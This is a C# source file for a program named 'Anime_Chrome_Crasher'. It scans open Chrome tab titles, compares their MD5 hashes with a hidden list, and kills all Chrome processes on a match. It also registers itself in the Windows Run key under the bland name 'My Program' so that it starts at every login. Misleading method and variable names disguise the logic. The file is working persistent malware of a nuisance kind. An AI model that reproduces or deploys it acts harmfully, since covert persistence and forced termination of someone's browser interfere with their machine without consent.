using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Windows.Automation;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;

namespace Anime_Chrome_Crasher
{
    public class FindWindows
    {

        public static bool GetChrome()
        {
            Process[] getchrome = Process.GetProcessesByName("chrome");
            return (getchrome.Length <= 0) ? false : true;
        }

        public static bool CheckTabs()
        {
            Process[] Chrome = Process.GetProcessesByName("chrome");
            foreach (Process proc in Chrome)
            {
                if (proc.MainWindowHandle == IntPtr.Zero)
                {
                    continue;
                }
                AutomationElement root = AutomationElement.FromHandle(proc.MainWindowHandle);
                Condition condNewTab = new PropertyCondition(AutomationElement.NameProperty, "New Tab");
                AutomationElement elmNewTab = root.FindFirst(TreeScope.Descendants, condNewTab);
                TreeWalker treewalker = TreeWalker.ControlViewWalker;
                try
                {
                    AutomationElement elmTabStrip = treewalker.GetParent(elmNewTab);
                    Condition condTabItem = new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.TabItem);
                    using (MD5 chromeHash = MD5.Create())
                        {
                            String[] AsyncStringBuilder = {"387e6278d8e06083d813358762e0ac63", "a7d11f2978e1d898b26a6e24afed17aa", "0335999beab1477ebb661fdbe2600a29", "d2e191f58fb920721c389b7f20df3bf7",
                                        "a546286b186828c32782c2999c8772fd", "2e4f1bd274410d813d33ec4d482d3f8a", "97dc8cb4347e04ff7f570693a7877b7f", "fb66277630cca1681b3f7bb3860015de","3e29ad85850570def728caab8d3ea94e"};
                                foreach (AutomationElement tabitem in elmTabStrip.FindAll(TreeScope.Children, condTabItem))
                                    {
                                        foreach (String s in AsyncStringBuilder)
                                            {
                                                if (s.Equals(AsyncChromeHashChecker(chromeHash, tabitem.Current.Name)))
                                                    {
                                                        killWindow("chrome");
                                                            return true;
                                                    }
                                            }
                                    }
                        }
                }
                catch (ArgumentNullException)
                {
                    return false;
                }
            }
            return false;
        }

        public static void Start()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue("My Program", "\"" + Application.ExecutablePath + "\"");
            }
        }

        public static void killWindow(string windowname)
        {
            foreach (var process in Process.GetProcessesByName(windowname))
            {
                try
                {
                    try
                    {
                        process.Kill();
                    }
                    catch (InvalidOperationException)
                    {

                    }
                }
                catch (System.ComponentModel.Win32Exception)
                {

                }
            }
        }
        static string AsyncChromeHashChecker(MD5 chromeHash, string input)
        {
        byte[] data = chromeHash.ComputeHash(Encoding.UTF8.GetBytes(input));
        StringBuilder sBuilder = new StringBuilder();
        for (int i = 0; i < data.Length; i++)
        {
            sBuilder.Append(data[i].ToString("x2"));
        }
        return sBuilder.ToString();
    }
    }

}